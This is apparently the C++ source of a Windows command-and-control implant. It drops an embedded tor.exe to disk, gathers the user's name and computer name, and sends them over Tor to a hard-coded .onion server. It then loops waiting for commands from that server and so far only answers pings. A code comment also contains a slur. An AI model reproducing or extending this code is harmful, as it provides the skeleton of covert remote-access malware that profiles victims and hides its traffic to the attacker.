#include "TorPlusPlus/torplusplus.hpp"
#include "torExeRes.h"

#include <Windows.h>
#include <lmcons.h>
#include <string>
#include <fstream>

HMODULE GetCurrentModule() {
    HMODULE hModule = NULL;
    GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCTSTR)GetCurrentModule, &hModule);
    return hModule;
}

void dropTor() {
    // Get a pointer to tor.zip
    HMODULE hCurrentModule = GetCurrentModule();
    HRSRC hTorExeRes = FindResource(hCurrentModule, MAKEINTRESOURCE(TOREXE), MAKEINTRESOURCE(EXEFILE));
    HGLOBAL hTorExeData = LoadResource(hCurrentModule, hTorExeRes);
    DWORD hTorExeSize = SizeofResource(hCurrentModule, hTorExeRes);
    char* hTorExeFinal = (char*)LockResource(hTorExeData);
    // Write hTorZipFinal to disk
    std::ofstream torExeFile("tor.exe", std::ios::binary);
    torExeFile.write(hTorExeFinal, hTorExeSize);
    torExeFile.close();
}

#define HOST "zd2j5murooa4imqzfa52ikp3rxsauti5fip4k4atppdbvpgdewzkwpyd.onion"

int main() {
    // Gather the information that will be sent to the server upon initial connection
    // ip, username, hostname
    // For now, ignoring getting the IP address since it requires a bit of extra work
    std::string IP = "0.0.0.0";
    // Get the username of the current user
    TCHAR usernameTC[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserName(usernameTC, &username_len);
    // Get the hostname of the current computer
    TCHAR hostnameTC[UNLEN + 1];
    DWORD hostname_len = UNLEN + 1;
    GetComputerName(hostnameTC, &hostname_len);

    // Convert the TCHARs to std::strings
    std::wstring usernameWStr(&usernameTC[0]);
    std::wstring hostnameWStr(&hostnameTC[0]);
    std::string usernameStr(usernameWStr.begin(), usernameWStr.end());
    std::string hostnameStr(hostnameWStr.begin(), hostnameWStr.end());
    // This is fucking retarded ^
    
    // Start up TOR
    if (GetFileAttributes(L"tor.exe") == INVALID_FILE_ATTRIBUTES) {
        dropTor();
    }
    torPlusPlus::torSocket torSock; // Create a torSocket object.
    torSock.startAndConnectToProxy(".\\tor.exe");
    
    // Attempt to connect to the host and set up the connection
    torSock.connectProxyTo(HOST); // Connect the proxy to the onion address
    // Send the initial connection information (<ip>;<username>;<hostname>;)
    std::string connReq = IP + ";" + usernameStr + ";" + hostnameStr + ";";
    torSock.proxySend(connReq.c_str(), connReq.size());
    printf("Sent: %s\n", connReq.c_str());
    // Receive the response from the server
    // It should be "<ip>;<username>;<hostname>;connected"
    char connResponseBuff[1024] = { 0 }; // Should definetly fit in a kilobyte
    torSock.proxyRecv(connResponseBuff, 1024);
    std::string connResponse = connResponseBuff;
    // Check if the response indicates that the connection was successful
    if (connResponse.find("connected") == std::string::npos) {
        // The connection was not successful
        printf("CONN FAILED");
    }
    else {
        // The connection was successful
        printf("CONN SUCCESS");
    }
    
    while (1) {
        char cmdBuff[1024] = { 0 };
        torSock.proxyRecv(cmdBuff, 1024);
        std::string cmd = cmdBuff;
        if (cmd.starts_with("ping;")) {
            torSock.proxySend("ping;pong;", 10);
        }
        printf("CMD: %s\n", cmd.c_str());
    }

    return 0;
}